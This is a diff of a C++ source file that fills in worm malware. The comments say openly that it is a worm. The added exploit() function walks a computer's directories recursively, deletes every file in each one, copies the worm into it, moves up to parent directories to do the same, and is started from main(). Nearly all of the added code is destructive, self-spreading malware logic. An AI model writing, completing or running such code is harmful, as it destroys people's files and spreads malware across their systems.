@@ -64,12 +64,57 @@ void propagate(std::string destination) {
 // This function is responsible to recursively navigate through all
 // directories in the target computer, copying the worm malware and deleting
 // all other files in it
-std::filesystem::path run(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
-    return;
+std::filesystem::path exploit(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
+    // Declaring origin as string variable
+    std::string origin_str = origin.string();
+    // Adds origin to directory history
+    dirhist.addDirectory(origin_str);
+    
+    // Loops through all sub directories and navigate inside them
+    for (const std::string &sub : sub_dirs) {
+        // Path to subdirectory variable
+        std::string path_to_sub_str = origin_str + "/" + sub;
+        // check if the current sub was not already
+        // visited by the program.
+        // If it is not visited, adds to the dirhist
+        // enumerates all sub directories inside it
+        // changes the origin to the current subdir path
+        // deletes all files in the current subdir
+        // propagates the worm into it
+        // recursively call the exploit with new origin and sub_dirs
+        if (!dirhist.directoryExists(path_to_sub_str)) {
+            dirhist.addDirectory(path_to_sub_str);
+            // checks if there are subs inside sub
+            std::vector<std::string> subs_inside = checkSubDir(path_to_sub_str);
+            // new origin
+            std::filesystem::path new_origin(path_to_sub_str);
+            // deletes all files in current sub
+            deleteAll(path_to_sub_str);
+            // propagates the worm
+            propagate(path_to_sub_str);
+            // recursion
+            return exploit(new_origin, subs_inside);
+        }
+    }
+
+    // If there are not sub directories and worm was already
+    // copied, goes back to the parent directory and recursively
+    // call the exploit again
+    std::filesystem::path parent = origin.parent_path();
+    std::string parent_str = parent.string();
+    std::vector<std::string> parent_subs = checkSubDir(parent_str);
+    // deletes all files in parent dir
+    deleteAll(parent_str);
+    // propagates the worm into the parent dir
+    propagate(parent_str);
+    // recursion
+    return exploit(parent, parent_subs);
 }
 
 int main() {
-    return 0;
+    // checks for subdirs for first iteration
+    std::vector<std::string> subs = checkSubDir(first_origin);
+    exploit(first_origin, subs);
 }
 
 
